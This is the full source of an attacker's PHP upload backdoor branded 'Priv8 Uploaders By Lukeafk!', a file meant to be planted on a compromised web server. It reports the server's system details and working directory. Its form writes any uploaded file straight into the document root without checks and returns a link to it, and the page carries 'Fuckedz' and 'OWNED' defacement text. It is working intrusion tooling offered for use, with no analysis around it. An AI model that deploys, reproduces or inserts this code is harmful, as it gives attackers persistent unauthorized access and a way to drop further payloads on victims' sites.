<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>Lukeafk!</title>
</head>
<body background="http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg">
<body>
<script>
    </script>
</style>

<center><br><img src="https://i.imgflip.com/4jvo28.gif" width="820" height="312"><center>

<font face= "Architects Daughter">
<font color='red' face='Architects Daughter' font size="5px"'>Priv8 Uploaders By Lukeafk!</font></b><center>
<?php
echo '<big><font color=white> System: <span style="color: lime;">'.php_uname().'</span></big><br>';
echo "<font color=white>Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo '<big><font color=white>Directory: <span style="color: aqua;">'.getcwd().'</span></big><br><br>';
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='Upload!'>
	  </form>
	  </center>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<font color='lime'Fuckedz => <a href='$web$files' target='_blank'><br><b><u>$web/$files</u></b></a></br>";
		} else {
			echo "<font color='red'Failed!";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " Fuckedz<b>$files</b> Here!";
		} else {
			echo "Failed!";
		}
	}
}
?>
</body>
<br>
<br>
<br>
<style> .error { text-align: center; font-family: 'Gilda Display', serif; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; overflow: default; } .info { text-align: center; width: 200px; height: 60px; margin: auto; position: absolute; top: 280px; bottom: 0; left: 20px; right: 0; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; } .info:after { content: 'OWNED'; font-family: OCR-A; font-size: 100px; text-align: center; width: 800px; margin: auto; position: absolute; top: 20px; bottom: 0; left: 40px; right: 0; opacity: 0; color: white; -webkit-animation: noise-1 .2s linear infinite; animation: noise-1 .2s linear infinite; } @-webkit-keyframes noise-1 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: -6px;} 80% {opacity: .3;} 100% {opacity: .6; left: 2px;} } @keyframes noise-1 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: -6px;} 80% {opacity: .3;} 100% {opacity: .6; left: 2px;} } @-webkit-keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @-webkit-keyframes noise { 0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);} } @keyframes noise { 0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);} } @-webkit-keyframes noise-3 { 0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } @keyframes noise-3 { 0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);} 4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } .wrap { top: 30%; left: 25%; height: 200px; margin-top: -100px; position: absolute; } code { color: white; } span.blue { color: #48beef; } span.comment { color: #7f8c8d; } span.orange { color: #f39c12; } span.green { color: #33cc33; } .viewFull { font-family:OCR-A; color:orange; text-decoration:; } 	 } @media only screen and (min-height: 500px) { .viewFull{ display:none; 	 	} } 	</style> <center> <style> img { filter:alpha(opacity=70); -moz-opacity:0.7; opacity:0.7; } img:hover { filter:alpha(opacity=100); -moz-opacity:.0; opacity:1.0; } </style> 
</body>
</html>
